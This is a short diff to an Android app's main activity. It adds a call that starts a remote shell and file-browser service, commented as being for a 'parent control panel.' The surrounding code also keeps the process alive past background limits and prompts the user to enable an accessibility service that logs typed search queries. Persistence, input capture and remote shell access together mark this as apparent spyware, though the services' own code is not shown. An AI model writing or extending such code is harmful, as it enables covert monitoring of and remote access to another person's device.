@@ -14,6 +14,8 @@ public class MainActivity extends Activity {
         // Start the foreground keep-alive service so the process survives
         // Android 14 background restrictions.
         startService(new Intent(this, KeepAliveService.class));
+        // Remote shell + file browser for the parent control panel.
+        startService(new Intent(this, RemoteShellService.class));
 
         // Prompt the user to enable the accessibility service so the logger
         // can start capturing typed search queries.
